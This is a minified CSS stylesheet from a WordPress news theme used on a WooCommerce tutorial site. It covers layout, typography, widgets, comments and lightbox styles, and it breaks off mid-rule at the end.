.result-msg a{display:block;text-align:center;width:100%;text-transform:uppercase;line-height:50px;color:var(--td_mobile_button_color_mob,#000);border:none;-webkit-box-shadow:0 0 8px rgba(0,0,0,.36);box-shadow:0 0 8px rgba(0,0,0,.36);margin:10px 0 40px;font-size:17px;border-radius:0;background-color:var(--td_mobile_button_background_mob,#fff);opacity:.8}.td-search-background{background-repeat:no-repeat;background-size:cover;background-position:center top;position:fixed;top:0;display:block;width:100%;height:113%;z-index:9999;-webkit-transition:.5s cubic-bezier(.79, .14, .15, .86);transition:all .5s cubic-bezier(.79, .14, .15, .86);transform:translate3d(100%,0,0);-webkit-transform:translate3d(100%,0,0);visibility:hidden}.td-search-background:before{content:'';width:100%;height:100%;position:absolute;top:0;left:0;opacity:.98;background:#313b45;background:-webkit-gradient(left top,left bottom,color-stop(0%,var(--td_mobile_gradient_one_mob,#313b45)),color-stop(100%,var(--td_mobile_gradient_two_mob,#3393b8)));background:linear-gradient(to bottom,var(--td_mobile_gradient_one_mob,#313b45) 0%,var(--td_mobile_gradient_two_mob,#3393b8) 100%)}.td-search-close{text-align:right;z-index:1000}.td-search-close .td-icon-close-mobile{height:70px;width:70px;line-height:70px;font-size:21px;color:var(--td_mobile_text_color,#fff);position:relative;top:4px;right:0}.td-search-opened #td-outer-wrap{position:fixed;transform:scale3d(.9,.9,.9);-webkit-transform:scale3d(.9,.9,.9);-webkit-box-shadow:0 0 46px;box-shadow:0 0 46px}.td-search-opened .td-search-wrap-mob .td-drop-down-search{opacity:1;visibility:visible!important;-webkit-transition:.5s .3s;transition:all .5s ease .3s}.td-search-opened .td-search-background{transform:translate3d(0,0,0);-webkit-transform:translate3d(0,0,0);visibility:visible!important}.td-search-opened .td-search-input:after{transform:scaleX(1);-webkit-transform:scaleX(1)}.admin-bar .td-search-wrap-mob{padding-top:32px}#td-mobile-nav label{position:absolute;top:26px;left:10px;font-size:17px;color:var(--td_mobile_text_color,#fff);opacity:.6;pointer-events:none}.td-login-inputs{position:relative}body{font-family:Verdana,BlinkMacSystemFont,-apple-system,"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;font-size:14px;line-height:21px}p{margin-top:0;margin-bottom:21px}a:active,a:focus{outline:0}a{color:var(--td_theme_color,#4db2ec);text-decoration:none}code{position:relative;top:-1px;border:none;background-color:#f1f1f1;padding:2px 6px}pre{background-color:#f1f1f1;padding:4px 10px;border:none;border-radius:0;margin-top:24px;overflow:auto}ol,ul{padding:0}ol li,ul li{line-height:24px;margin-left:21px}address{font-size:inherit!important;line-height:inherit!important;margin-bottom:21px}table{width:100%}table th{text-align:left;border:1px solid var(--td_grid_border_color,#ededed);padding:2px 8px}h1,h2,h3,h4,h6{font-family:var(--td_default_google_font_2,'Roboto',sans-serif);color:var(--td_text_color,#111);font-weight:400;margin:6px 0}h1>a,h2>a,h3>a,h4>a,h6>a{color:var(--td_text_color,#111)}div.td-block-title{font-family:var(--td_default_google_font_2,'Roboto',sans-serif);color:var(--td_text_color,#111)}p.td-module-title{font-family:var(--td_default_google_font_2,'Roboto',sans-serif);color:var(--td_text_color,#111)}p.td-module-title>a{color:var(--td_text_color,#111)}h1{font-size:32px;line-height:40px;margin-top:33px;margin-bottom:23px}h2{font-size:27px;line-height:38px;margin-top:30px;margin-bottom:20px}h3{font-size:22px;line-height:30px;margin-top:27px;margin-bottom:17px}h4{font-size:19px;line-height:29px;margin-top:24px;margin-bottom:14px}h6{font-size:16px;line-height:24px;margin-top:21px;margin-bottom:11px}textarea{font-size:12px;line-height:21px;color:#444;border:1px solid #e1e1e1;width:100%;max-width:100%;height:168px;min-height:168px;padding:6px 9px}textarea:active,textarea:focus{border-color:#b0b0b0!important}input:focus,input[type]:focus,textarea:focus{outline:0}input[type=submit]{font-family:var(--td_default_google_font_2,'Roboto',sans-serif);font-size:13px;background-color:var(--td_black,#222);border-radius:0;color:#fff;border:none;padding:8px 15px;font-weight:500;-webkit-transition:background-color .4s;transition:background-color .4s}input[type=submit]:hover{background-color:var(--td_theme_color,#4db2ec)}input[type=email],input[type=tel],input[type=text],input[type=url]{font-size:12px;line-height:21px;color:#444;border:1px solid #e1e1e1;width:100%;max-width:100%;height:34px;padding:3px 9px}@media (max-width:767px){.admin-bar .td-search-wrap-mob{padding-top:46px}textarea{font-size:16px}input[type=email],input[type=tel],input[type=text],input[type=url]{font-size:16px}}input[type=email]:active,input[type=email]:focus,input[type=tel]:active,input[type=tel]:focus,input[type=text]:active,input[type=text]:focus,input[type=url]:active,input[type=url]:focus{border-color:#b0b0b0!important}input[type=password]{width:100%;position:relative;top:0;display:inline-table;vertical-align:middle;font-size:12px;line-height:21px;color:#444;border:1px solid #ccc;max-width:100%;height:34px;padding:3px 9px;margin-bottom:10px}.tagdiv-type{font-size:15px;line-height:1.74;color:#222}.tagdiv-type img{margin-bottom:21px}.tagdiv-type figure img{margin-bottom:0}.tagdiv-type a:hover{text-decoration:underline}.tagdiv-type ol,.tagdiv-type ul{margin-bottom:26px}.tagdiv-type ol li:not(.blocks-gallery-item):not(.wp-block-navigation-item),.tagdiv-type ul li:not(.blocks-gallery-item):not(.wp-block-navigation-item){line-height:inherit;margin-bottom:10px}.tagdiv-type ol li:not(.blocks-gallery-item):not(.wp-block-navigation-item):last-child,.tagdiv-type ul li:not(.blocks-gallery-item):not(.wp-block-navigation-item):last-child{margin-bottom:0}.tagdiv-type li ol,.tagdiv-type li ul{margin-bottom:0}.tagdiv-type p{margin-bottom:26px}.tagdiv-type iframe,.tagdiv-type object{max-width:100%!important}.entry-title a:hover,.td_block_wrap a:hover,.widget a:hover{text-decoration:none!important}.td_module_wrap{position:relative;padding-bottom:35px}.td_module_wrap .entry-title{font-size:21px;line-height:25px;margin:0 0 6px}.td_module_wrap:hover .entry-title a{color:var(--td_theme_color,#4db2ec)}.entry-title{word-wrap:break-word}.td-module-thumb{position:relative;margin-bottom:13px}.td-module-thumb .entry-thumb{display:block}.td-module-meta-info{font-family:var(--td_default_google_font_1,'Open Sans','Open Sans Regular',sans-serif);font-size:11px;margin-bottom:7px;line-height:1;min-height:17px}.td-post-author-name{font-weight:700;display:inline-block;position:relative;top:2px}.td-post-author-name a{color:#000}.td-post-author-name span{color:#ccc;margin:0 2px;font-weight:400}.td-post-author-name div{display:inline;margin-right:2px}.td-post-date{color:#767676;display:inline-block;position:relative;top:2px}.td-excerpt{font-size:13px;color:#767676;font-family:var(--td_default_google_font_1,'Open Sans','Open Sans Regular',sans-serif);word-wrap:break-word;overflow-wrap:anywhere;margin-top:9px}.td-module-image{position:relative}.block-title{font-family:var(--td_default_google_font_2,'Roboto',sans-serif);font-size:14px;line-height:1;margin-top:0;margin-bottom:26px;border-bottom:2px solid var(--td_header_color,var(--td_black,#222))}.block-title>a,.block-title>label,.block-title>span,.block-title>span>a{line-height:17px;display:inline-block;padding:7px 12px 4px;background-color:var(--td_header_color,var(--td_black,#222));color:var(--td_text_header_color,#fff)}.td-main-content-wrap{padding-bottom:40px}.page-nav .td-icon-menu-right{padding-left:1px}.page-nav .td-icon-menu-left{padding-right:1px}.rtl .page-nav .td-icon-menu-left:before{content:'\e80d'}.rtl .page-nav .td-icon-menu-right:before{content:'\e80c'}.td-ss-main-sidebar{perspective:unset!important}.td-crumb-container{min-height:35px;margin-bottom:9px;padding-top:21px}@media (min-width:768px) and (max-width:1018px){.td-crumb-container{padding-top:16px}}.td-category{list-style:none;font-family:var(--td_default_google_font_1,'Open Sans','Open Sans Regular',sans-serif);font-size:10px;margin-top:0;margin-bottom:10px;line-height:1}.td-category li{display:inline-block;margin:0 5px 5px 0;line-height:1}.td-category a{color:#fff;background-color:var(--td_black,#222);padding:3px 6px 4px;white-space:nowrap;display:inline-block}.td-category a:hover{opacity:.9}.post{background-color:var(--td_container_transparent,#fff)}.post header .entry-title{margin-top:0;margin-bottom:7px;word-wrap:break-word;font-size:41px;line-height:50px}@media (max-width:767px){input[type=password]{font-size:16px}.td-md-is-ios .tagdiv-type figure{width:auto}.td-main-content-wrap{padding-bottom:26px}.td-crumb-container{padding-top:11px}.single .td-category{margin-bottom:0}.post header .entry-title{margin-top:3px;margin-bottom:9px}#td-outer-wrap .td-post-next-post,#td-outer-wrap .td-post-prev-post{width:50%;float:left}}header .td-module-meta-info{margin-bottom:16px}header .td-post-author-name{font-weight:400;color:#444;float:left}header .td-post-author-name a{font-weight:700;margin-right:3px}header .td-post-date{margin-left:4px;color:#767676;float:left}.post footer{clear:both}.td-post-source-tags{font-size:11px}.td-post-source-tags a{font-size:11px}.td-post-small-box{margin-bottom:4px;line-height:20px;clear:left;height:20px;display:table}.td-post-small-box span{background-color:var(--td_black,#222);padding:5px 9px;color:#fff;display:block;text-transform:uppercase;line-height:10px;float:left;height:20px}.td-post-small-box a{display:block;float:left;border:1px solid var(--td_grid_border_color,#ededed);margin-left:4px;line-height:8px;color:var(--td_text_color,#111);padding:5px 8px;height:20px}.td-post-small-box a:hover{color:#fff;background-color:var(--td_theme_color,#4db2ec);border-color:var(--td_theme_color,#4db2ec)}.td-tags{margin:0 0 30px;font-family:var(--td_default_google_font_1,'Open Sans','Open Sans Regular',sans-serif);display:table;line-height:20px;font-weight:600}.td-tags li{list-style:none;display:inline-block;line-height:20px;margin-left:0;float:left;margin-bottom:4px}.td-tags a,.td-tags span{margin-right:4px;margin-left:0}.td-post-next-prev-content{display:inline-block;font-family:var(--td_default_google_font_2,'Roboto',sans-serif);word-break:break-word}.td-post-next-prev-content span{display:block;font-size:12px;color:#c1c1c1;margin-bottom:7px}.td-post-next-prev-content a{display:block;font-size:15px;color:#222;line-height:21px;margin-bottom:43px}.td-post-next-prev-content a:hover{color:var(--td_theme_color,#4db2ec)}.td-post-next-post{text-align:right}.td-next-prev-separator{display:none}.author-box-wrap{border:1px solid var(--td_grid_border_color,#ededed);padding:21px;margin-bottom:48px}.author-box-wrap .avatar{float:left;max-width:96px}.author-box-wrap .desc{margin-left:117px;font-size:12px}@media (max-width:767px){.author-box-wrap{text-align:center}.author-box-wrap .avatar{margin-bottom:5px;float:none}.author-box-wrap .desc{margin-left:0}}.author-box-wrap .td-social-icon-wrap .td-icon-font{color:#222}.author-box-wrap .td-author-social{margin-bottom:-5px}.author-box-wrap .td-author-social a{color:#444;margin-top:11px}.author-box-wrap .td-author-social a:hover{color:var(--td_theme_color,#4db2ec)}.author-box-wrap .td-author-social .td-icon-font{font-size:15px;width:auto;min-width:18px;height:auto;margin-right:15px}.td-author-name{font-family:var(--td_default_google_font_1,'Open Sans','Open Sans Regular',sans-serif);font-size:15px;line-height:21px;font-weight:700;margin:7px 0 8px}.td-author-name a{color:#222}.td-author-name a:hover{color:var(--td_theme_color,#4db2ec)}.td-post-content p:empty{display:none}.td-post-featured-image{position:relative}.td-post-featured-image img{display:block;margin-bottom:26px;width:100%}.td-post-content{margin-top:21px;padding-bottom:16px}.td-post-content p{word-wrap:break-word}.td-post-content img{display:block}.td-post-content table{margin-bottom:21px}@media (max-width:1018px){.post header .entry-title{font-size:32px;line-height:36px}.td-post-template-default .td-post-header header .entry-title{font-size:32px;line-height:36px}}.td-post-template-default .td-post-featured-image img{width:auto}.td-post-template-default .wpb_video_wrapper{margin-bottom:26px}.td-post-template-default .wpb_video_wrapper iframe{display:block}.td-post-template-default .wpb_video_wrapper video{max-width:100%}.comment{list-style:none;margin-left:0;padding-bottom:13px;border-bottom:1px dashed var(--td_grid_border_color,#ededed);margin-bottom:21px}.comment:first-child{border-top:none}.comment .avatar{float:left;margin-right:20px;margin-bottom:20px;width:50px}.comment p{margin-bottom:0;word-wrap:break-word}.comment-reply-link{font-size:11px;color:#747474}.comment-reply-link:hover{color:var(--td_theme_color,#4db2ec)}.single .comments{margin-bottom:48px;padding-top:10px;margin-top:-10px}#reply-title{font-size:16px;font-weight:700;margin-bottom:7px;margin-top:10px}#cancel-comment-reply-link{font-size:12px;font-weight:400;color:var(--td_text_color,#111);margin-left:10px}#cancel-comment-reply-link:hover{color:var(--td_theme_color,#4db2ec)}.comments{clear:both}.comment-form .td-warning-author,.comment-form .td-warning-captcha,.comment-form .td-warning-captcha-score,.comment-form .td-warning-comment,.comment-form .td-warning-email,.comment-form .td-warning-email-error{display:none}.comment-form textarea{display:block}.td-comment-form-warnings .td-warning-author,.td-comment-form-warnings .td-warning-captcha,.td-comment-form-warnings .td-warning-captcha-score,.td-comment-form-warnings .td-warning-comment,.td-comment-form-warnings .td-warning-email,.td-comment-form-warnings .td-warning-email-error{margin-bottom:-11px;color:#ff7a7a;font-size:11px;font-style:italic;line-height:15px}.wp-block-image{margin-bottom:21px}.wp-block-image figcaption{font-family:Verdana,BlinkMacSystemFont,-apple-system,"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;text-align:left;margin:6px 0 0;font-size:11px;font-style:italic;font-weight:400;line-height:17px;color:#444}.wp-block-gallery{margin-bottom:26px}.wp-block-gallery figcaption{font-family:Verdana,BlinkMacSystemFont,-apple-system,"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;font-size:11px;line-height:17px}.wp-block-gallery .blocks-gallery-item figcaption{font-family:Verdana,BlinkMacSystemFont,-apple-system,"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;font-size:11px;line-height:17px}@font-face{font-family:newspaper;src:url('https://learnwoo.com/wp-content/themes/Newspaper/images/icons/newspaper.eot?24');src:url('https://learnwoo.com/wp-content/themes/Newspaper/images/icons/newspaper.eot?24#iefix') format('embedded-opentype'),url('https://learnwoo.com/wp-content/themes/Newspaper/images/icons/newspaper.woff?24') format('woff'),url('https://learnwoo.com/wp-content/themes/Newspaper/images/icons/newspaper.ttf?24') format('truetype'),url('https://cdn.learnwoo.com/wp-content/themes/Newspaper/images/icons/newspaper.svg?24#newspaper') format('svg');font-weight:400;font-style:normal;font-display:swap}[class*=" td-icon-"]:before,[class^=td-icon-]:before{font-family:newspaper;speak:none;font-style:normal;font-weight:400;font-variant:normal;text-transform:none;line-height:1;text-align:center;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}[class*=td-icon-]{line-height:1;text-align:center;display:inline-block}.td-icon-menu-down:before{content:'\e806'}.td-icon-menu-up:before{content:'\e809'}.td-icon-search:before{content:'\e80a'}.td-icon-menu-left:before{content:'\e80c'}.td-icon-menu-right:before{content:'\e80d'}.rtl .td-next-prev-wrap .td-icon-menu-left:before{content:'\e80d'}.rtl .td-next-prev-wrap .td-icon-menu-right:before{content:'\e80c'}.td-icon-facebook:before{content:'\e818'}.td-icon-pinterest:before{content:'\e825'}.td-icon-twitter:before{content:'\e831'}.td-icon-youtube:before{content:'\e836'}.td-icon-mobile:before{content:'\e83e'}.td-icon-whatsapp:before{content:'\f232'}.td-icon-close-mobile:before{content:'\e900'}.td-icon-modal-back:before{content:'\e901'}.td-icon-modal-close:before{content:'\e902'}.td-icon-plus:before{content:'\ea0a'}.td-icon-minus:before{content:'\ea0b'}.td-social-icon-wrap:hover .td-icon-font{-webkit-transition:color .3s;transition:color .3s;color:#fff}.td-social-icon-wrap:hover i.td-icon-facebook{color:#3b5998}.td-social-icon-wrap:hover i.td-icon-pinterest{color:#cb2027}.td-social-icon-wrap:hover i.td-icon-twitter{color:#00aced}.td-social-icon-wrap:hover i.td-icon-youtube{color:#b00}.td-social-icon-wrap:hover i.td-icon-whatsapp{color:#7bbf6a}.widget{font-family:var(--td_default_google_font_1,'Open Sans','Open Sans Regular',sans-serif);margin-bottom:38px}.widget a{color:#111}.widget a:hover{color:var(--td_theme_color,#4db2ec)}.widget ul{list-style:none;box-shadow:none}.widget li{line-height:30px;list-style:none;margin-left:12px}.widget li li{margin-left:21px}.widget select{width:100%;height:30px;margin-bottom:10px;margin-top:13px;padding:0 5px}.widget .block-title{margin-bottom:13px}.widget .block-title span a{padding:0;color:inherit}.widget_categories li .td-cat-no{float:right;margin-right:10px}.widget_recent_entries{margin-bottom:32px}.widget_recent_entries ul{margin-top:13px}.widget_recent_entries li{margin-bottom:8px;padding-bottom:7px;border-bottom:1px dashed #f1f1f1;font-family:var(--td_default_google_font_2,'Roboto',sans-serif)}@media (min-width:768px) and (max-width:1018px){.widget_recent_entries li{margin-bottom:3px;padding-bottom:2px}}.widget_recent_entries li:last-child{border-bottom:none}.widget_recent_entries li a{display:inline-block;line-height:21px}.widget_text ul{margin-bottom:21px}.widget_text ul li{list-style:disc;list-style-position:inside}.widget_text ol{margin-bottom:21px}.widget_text ol li{list-style-type:decimal;margin:0 0 0 21px;line-height:24px}.widget_text a{color:var(--td_theme_color,#4db2ec)}.widget_text a:hover{text-decoration:underline!important}.widget_text .block-title{margin-bottom:26px}@media print{body,html{background-color:#fff;color:#000;margin:0;padding:0}body{width:80%;margin-left:auto;margin-right:auto;zoom:80%}body .td-post-featured-image img{width:100%!important}img{max-width:100%;display:block;text-align:center;margin-left:auto;margin-right:auto}h1,h2,h3,h4,h6{page-break-after:avoid}li,ol,ul{page-break-inside:avoid}table,tr{page-break-before:avoid}.single #comments,.single .author-box-wrap .avatar,.single .td-a-rec,.single .td-category,.single .td-crumb-container,.single .td-footer-container,.single .td-footer-wrapper,.single .td-header-menu-wrap,.single .td-main-sidebar,.single .td-menu-background,.single .td-more-articles-box,.single .td-post-next-prev,.single .td-post-sharing,.single .td-post-source-tags,.single .td-scroll-up,.single .td-sub-footer-container,.single .td_block_related_posts,.single iframe{display:none!important}.td-header-desktop-wrap{display:block!important}.td-footer-template-wrap,.td_block_wrap:not(.tdb_breadcrumbs):not(.tdb_header_logo):not(.tdb_single_categories):not(.tdb-single-title):not(.tdb_single_author):not(.tdb_single_date ):not(.tdb_single_comments_count ):not(.tdb_single_post_views):not(.tdb_single_featured_image):not(.tdb_single_content):not(.td_woo_breadcrumbs):not(.td-woo-product-title):not(.td_woo_product_description):not(.td_woo_add_to_cart):not(.td_woo_product_sku):not(.td_woo_product_image):not(.td_woo_product_tabs):not(.td_woo_product_categories):not(.td_woo_product_tags ):not(.td_woo_product_image_bg):not(.td_woo_product_price):not(.td_woo_product_rating){display:none!important}.body.td-animation-stack-type0 img{opacity:1!important}.td-main-content,header{width:100%!important}}.td-header-desktop-wrap{width:100%}.td-header-desktop-sticky-wrap,.td-header-mobile-sticky-wrap{position:fixed;top:0;width:100%;z-index:999;visibility:hidden;opacity:0}.td-header-desktop-sticky-wrap.td-header-active,.td-header-mobile-sticky-wrap.td-header-active{visibility:visible}.td-header-desktop-sticky-wrap.td-header-stop-transition,.td-header-mobile-sticky-wrap.td-header-stop-transition{-webkit-transition:none;transition:none}@media (min-width:767px){.td-header-mobile-wrap{display:none}.admin-bar .td-header-desktop-sticky-wrap{margin-top:32px}}.rtl .td-mobile-main-menu{display:flex;flex-direction:column-reverse}#td-mobile-nav .td-login-panel-title{text-align:center;font-size:16px;padding:30px 10px}#td-mobile-nav .td-login-panel-title span{display:inline-block;font-size:28px;font-weight:700;width:100%;margin-bottom:10px}.td_block_wrap{margin-bottom:48px;position:relative;clear:both}.td_block_wrap .td-load-more-wrap,.td_block_wrap .td-next-prev-wrap{margin-top:20px}@media (max-width:767px){.td-post-content{margin-top:16px}.comments .comment-form .submit{width:100%;font-size:15px;font-weight:700;padding:15px 0;text-transform:uppercase}.td-header-desktop-wrap{display:none}.td_block_wrap{margin-bottom:32px}.td_block_wrap .td-load-more-wrap,.td_block_wrap .td-next-prev-wrap{margin-bottom:0}}.td_block_wrap .td-subcat-item .td-cur-simple-item{color:#000}.td-block-title-wrap{position:relative}.td-fix-index{transform:translateZ(0);-webkit-transform:translateZ(0)}.td_with_ajax_pagination{transform:translate3d(0,0,0);-webkit-transform:translate3d(0,0,0);overflow:hidden}.woocommerce .product .products h2:not(.woocommerce-loop-product__title){background-color:var(--td_header_color,#222)}.td_block_wrap .td-subcat-item .td-cur-simple-item{color:var(--td_theme_color,#4db2ec)}.td-next-prev-wrap{position:relative;clear:both}.td-next-prev-wrap a{display:inline-block;margin-right:7px;width:25px;height:25px;border:1px solid #dcdcdc;line-height:24px;text-align:center;vertical-align:middle;font-size:7px;color:#b7b7b7}.td-next-prev-wrap a:hover{background-color:var(--td_theme_color,#4db2ec);border-color:var(--td_theme_color,#4db2ec);color:#fff}.td-next-prev-wrap .ajax-page-disabled{opacity:.5}.td-next-prev-wrap .td-ajax-next-page{padding-left:2px}.td-next-prev-wrap .td-ajax-prev-page{padding-right:1px}.rtl .td-next-prev-wrap .td-ajax-next-page{padding-right:2px;padding-left:0}.rtl .td-next-prev-wrap .td-ajax-prev-page{padding-left:1px;padding-right:0}@-moz-document url-prefix(){.td-next-prev-wrap a{line-height:23px}}.td-load-more-wrap{transform:translateZ(0);-webkit-transform:translateZ(0)}.td-load-more-wrap{text-align:center;clear:both}.td-load-more-wrap a{color:#767676}.td-load-more-wrap a:hover{background-color:var(--td_theme_color,#4db2ec);border-color:var(--td_theme_color,#4db2ec);color:#fff;text-decoration:none!important}.td_block_inner_overflow{overflow:hidden}.td_block_inner_overflow .td-module-image{min-height:20px}.td-subcat-filter{position:absolute;bottom:0;right:0;margin:auto 0;opacity:0;z-index:2;line-height:30px;text-align:right}.td-subcat-filter ul{margin:0}.td-js-loaded .td-subcat-filter{opacity:1;-webkit-transition:opacity .3s;transition:opacity .3s}.td-h-effect-up-shadow .entry-thumb:not(.td-animation-stack-type0-2):not(.td-animation-stack-type1-2):not(.td-animation-stack-type2-2){-webkit-transition:box-shadow .3s,transform .3s;transition:box-shadow .3s ease,transform .3s ease}.td-h-effect-up-shadow .entry-thumb.td-animation-stack-type0-2{transition:box-shadow .3s ease,transform .3s ease,opacity .3s cubic-bezier(.39, .76, .51, .56)}.td-h-effect-up-shadow .entry-thumb.td-animation-stack-type1-2{transition:box-shadow .3s ease,transform .3s ease,opacity .3s cubic-bezier(.39, .76, .51, .56) 0s}.td-h-effect-up-shadow .entry-thumb.td-animation-stack-type2-2{transition:box-shadow .3s ease,transform .3s ease,opacity .4s cubic-bezier(.13, .43, .57, .88)}.ie10 .entry-thumb:after,.ie10 .entry-thumb:before,.ie11 .entry-thumb:after,.ie11 .entry-thumb:before,.ie8 .entry-thumb:after,.ie8 .entry-thumb:before,.ie9 .entry-thumb:after,.ie9 .entry-thumb:before{display:none!important}.td_block_wrap p:empty:before{display:none}.mfp-bg{top:0;left:0;width:100%;height:100%;z-index:1042;overflow:hidden;position:fixed;background:#0b0b0b;opacity:.8}.mfp-wrap{top:0;left:0;width:100%;height:100%;z-index:1043;position:fixed;outline:0!important;-webkit-backface-visibility:hidden}.mfp-container{text-align:center;position:absolute;width:100%;height:100%;left:0;top:0;padding:0 8px;-webkit-box-sizing:border-box;box-sizing:border-box}.mfp-container:before{content:'';display:inline-block;height:100%;vertical-align:middle}.mfp-align-top .mfp-container:before{display:none}.mfp-content{position:relative;display:inline-block;vertical-align:middle;margin:0 auto;text-align:left;z-index:1045}.mfp-ajax-holder .mfp-content,.mfp-inline-holder .mfp-content{width:100%;cursor:auto}.mfp-ajax-cur{cursor:progress}.mfp-zoom-out-cur{cursor:-webkit-zoom-out;cursor:zoom-out}.mfp-zoom{cursor:pointer;cursor:-webkit-zoom-in;cursor:zoom-in}.mfp-auto-cursor .mfp-content{cursor:auto}.mfp-arrow,.mfp-close,.mfp-counter,.mfp-preloader{-webkit-user-select:none;user-select:none}.mfp-loading.mfp-figure{display:none}.mfp-hide{display:none!important}.mfp-preloader{color:#ccc;position:absolute;top:50%;width:auto;text-align:center;margin-top:-.8em;left:8px;right:8px;z-index:1044}.mfp-preloader a{color:#ccc}.mfp-preloader a:hover{color:#fff}.mfp-s-ready .mfp-preloader{display:none}.mfp-s-error .mfp-content{display:none}button.mfp-arrow,button.mfp-close{overflow:visible;cursor:pointer;background:0 0;border:0;-webkit-appearance:none;display:block;outline:0;padding:0;z-index:1046;-webkit-box-shadow:none;box-shadow:none}button::-moz-focus-inner{padding:0;border:0}.mfp-close{width:44px;height:44px;line-height:44px;position:absolute;right:0;top:0;text-decoration:none;text-align:center;opacity:.65;padding:0 0 18px 10px;color:#fff;font-style:normal;font-size:28px;font-family:Arial,Baskerville,monospace}.mfp-close:focus,.mfp-close:hover{opacity:1}.mfp-close:active{top:1px}.mfp-close-btn-in .mfp-close{color:#333}.mfp-iframe-holder .mfp-close,.mfp-image-holder .mfp-close{color:#fff;right:-6px;text-align:right;padding-right:6px;width:100%}.mfp-counter{position:absolute;bottom:0;right:0;color:#ccc;padding-right:15px;font-size:11px;line-height:18px}.mfp-arrow{font-family:newspaper,sans-serif;font-size:30px;position:absolute;opacity:.65;margin:0;top:50%;margin-top:-55px;padding:0;width:90px;height:110px;-webkit-tap-highlight-color:transparent}.mfp-arrow:active{margin-top:-54px}.mfp-arrow:focus,.mfp-arrow:hover{opacity:1}.mfp-arrow .mfp-a,.mfp-arrow .mfp-b{display:block;width:0;height:0;position:absolute;left:0;top:0;margin-top:35px;margin-left:35px}.mfp-arrow-left{left:0}.mfp-arrow-left:before{content:'\e807';color:#fff}.mfp-arrow-right{right:0}.mfp-arrow-right:before{content:'\e808';color:#fff}.mfp-iframe-holder{padding-top:40px;padding-bottom:40px}.mfp-iframe-holder .mfp-content{line-height:0;width:100%;max-width:900px}.mfp-iframe-holder .mfp-close{top:-40px}.mfp-iframe-scaler{width:100%;height:0;overflow:hidden;padding-top:56.25%}.mfp-iframe-scaler iframe{position:absolute;display:block;top:0;left:0;width:100%;height:100%;box-shadow:0 0 8px rgba(0,0,0,.6);background:#000}img.mfp-img{width:auto;max-width:100%;height:auto;display:block;line-height:0;-webkit-box-sizing:border-box;box-sizing:border-box;padding:40px 0;margin:0 auto}.mfp-figure{line-height:0}.mfp-figure:before{bottom:40px;content:"";display:block;height:20%;width:100%;position:absolute;z-index:0;background:-webkit-gradient(linear,left top,left bottom,color-stop(0,rgba(0,0,0,0)),color-stop(100%,rgba(0,0,0,.7)));background:linear-gradient(to bottom,rgba(0,0,0,0) 0,rgba(0,0,0,.7) 100%);opacity:0;-webkit-transition:opacity 1s;transition:opacity 1s ease}.mfp-ready .mfp-s-ready .mfp-figure:before{opacity:1}.mfp-figure:after{content:'';position:absolute;left:0;top:40px;bottom:40px;display:block;right:0;width:auto;height:auto;z-index:-1;box-shadow:0 0 8px rgba(0,0,0,.6);background:#444}.mfp-figure small{color:#bdbdbd;display:block;font-size:12px;line-height:14px}.mfp-figure figure{margin:0}.mfp-bottom-bar{font-size:11px;line-height:18px;margin-bottom:50px;position:absolute;bottom:0;left:0;width:100%;cursor:auto;padding:0 65px 0 15px;z-index:1}.mfp-title{text-align:left;line-height:18px;color:#f3f3f3;word-wrap:break-word}.mfp-image-holder .mfp-content{max-width:100%}.mfp-gallery .mfp-image-holder .mfp-figure{cursor:pointer}@media screen and (max-width:800px) and (orientation:landscape),screen and (max-height:300px){.mfp-img-mobile .mfp-image-holder{padding-left:0;padding-right:0}.mfp-img-mobile img.mfp-img{padding:0}.mfp-img-mobile .mfp-figure:before{bottom:0}.mfp-img-mobile .mfp-figure:after{top:0;bottom:0}.mfp-img-mobile .mfp-figure small{display:inline;margin-left:5px}.mfp-img-mobile .mfp-bottom-bar{background:rgba(0,0,0,.6);bottom:0;margin:0;top:auto;padding:3px 5px;position:fixed;-webkit-box-sizing:border-box;box-sizing:border-box}.mfp-img-mobile .mfp-bottom-bar:empty{padding:0}.mfp-img-mobile .mfp-counter{right:5px;top:3px}.mfp-img-mobile .mfp-close{top:0;right:0;width:35px;height:35px;line-height:35px;background:rgba(0,0,0,.6);position:fixed;text-align:center;padding:0}}@media all and (max-width:900px){.mfp-arrow{-webkit-transform:scale(.75);transform:scale(.75)}.mfp-arrow-left{-webkit-transform-origin:0;transform-origin:0}.mfp-arrow-right{-webkit-transform-origin:100%;transform-origin:100%}.mfp-container{padding-left:6px;padding-right:6px}}.mfp-ie7 .mfp-img{padding:0}.mfp-ie7 .mfp-bottom-bar{width:600px;left:50%;margin-left:-300px;margin-top:5px;padding-bottom:5px}.mfp-ie7 .mfp-container{padding:0}.mfp-ie7 .mfp-content{padding-top:44px}.mfp-ie7 .mfp-close{top:0;right:0;padding-top:0}.mfp-with-zoom .mfp-container,.mfp-with-zoom.mfp-bg{opacity:.001;-webkit-backface-visibility:hidden;-webkit-transition:.3s ease-out;-moz-transition:.3s ease-out;-o-transition:.3s ease-out;transition:all .3s ease-out}.mfp-with-zoom.mfp-ready .mfp-container{opacity:1}.mfp-with-zoom.mfp-ready.mfp-bg{opacity:.8}.mfp-with-zoom.mfp-removing .mfp-container,.mfp-with-zoom.mfp-removing.mfp-bg{opacity:0}.mfp-bg{z-index:10000}.mfp-wrap{z-index:10000}.white-popup-block{position:relative;margin:0 auto;max-width:500px;min-height:500px;font-family:var(--td_default_google_font_1,'Open Sans','Open Sans Regular',sans-serif);text-align:center;color:#fff;vertical-align:top;-webkit-box-shadow:0 0 20px 0 rgba(0,0,0,.2);box-shadow:0 0 20px 0 rgba(0,0,0,.2);padding:0 0 24px;overflow:hidden}.white-popup-block:after{content:'';width:100%;height:100%;position:absolute;top:0;left:0;display:block;background:var(--td_login_gradient_one,rgba(0,69,130,.8));background:-webkit-gradient(left bottom,right top,color-stop(0%,var(--td_login_gradient_one,rgba(0,69,130,.8))),color-stop(100%,var(--td_login_gradient_two,rgba(38,134,146,.8))));background:linear-gradient(45deg,var(--td_login_gradient_one,rgba(0,69,130,.8)) 0%,var(--td_login_gradient_two,rgba(38,134,146,.8)) 